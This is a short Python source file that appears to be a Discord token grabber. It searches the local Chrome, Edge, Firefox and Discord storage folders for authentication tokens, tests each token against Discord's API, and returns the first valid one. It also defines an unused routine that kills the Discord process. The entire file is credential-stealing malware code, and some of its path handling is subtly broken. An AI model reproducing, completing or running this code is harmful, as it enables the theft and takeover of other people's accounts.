import os,re,requests,psutil,sqlite3
def get_token():
 appdata=os.getenv("localappdata")
 roaming=os.getenv("appdata")
 chrome_path=os.path.join(appdata,"Google","Chrome","User Data")
 edge_path=os.path.join(appdata,"Microsoft","Edge","User Data")
 firefox_path=os.path.join(appdata,"Mozilla","Firefox","Profiles")
 discord_path=os.path.join(roaming,"discord","Local Storage","leveldb")
 regexp=r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
 tokens=[]
 valid_tokens=[]
 def kill_discord():
  for proc in psutil.process_iter(['pid','name']):
   if 'discord.exe' in proc.info['name'].lower():
    proc.terminate()
 def scan_folders():
  folders=[]
  if os.path.exists(chrome_path):
   folders.extend([os.path.join(chrome_path,folder) for folder in os.listdir(chrome_path) if os.path.isdir(os.path.join(chrome_path,folder))and folder not in("System Profile","Guest Profile")])
  if os.path.exists(edge_path):
   folders.extend([os.path.join(edge_path,folder) for folder in os.listdir(edge_path) if os.path.isdir(os.path.join(edge_path,folder))and folder not in("System Profile","Guest Profile")])
  if os.path.exists(firefox_path):
   folders.extend([os.path.join(firefox_path,folder) for folder in os.listdir(firefox_path) if os.path.isdir(os.path.join(firefox_path,folder))and not folder.endswith(".default-release")])
  if os.path.exists(discord_path):
   folders.append(discord_path)
  return folders
 def extract_tokens(path):
  leveldb_path=os.path.join(path,"Local Storage","leveldb")
  if os.path.exists(leveldb_path):
   for filename in os.listdir(leveldb_path):
    full_file_path=os.path.join(leveldb_path,filename)
    if filename.endswith(".ldb")or filename.endswith(".log"):
     try:
      with open(full_file_path,"r",encoding="utf-8",errors="ignore")as f:
       found_tokens=re.findall(regexp,f.read())
       for token in found_tokens:
        if not token.startswith("MT"):
         token="MT"+token
        tokens.append(token)
     except Exception as e:
      return
 def validate_token(token):
  url="https://discord.com/api/v9/users/@me"
  headers={"Authorization":token}
  try:
   response=requests.get(url,headers=headers)
   if response.status_code==200:
    user_info=response.json()
    valid_tokens.append(token)
  except requests.RequestException as e:
   return
 for folder in scan_folders():
  extract_tokens(folder)
 for token in tokens:
  validate_token(token)
 return valid_tokens[0]if valid_tokens else"N/A"
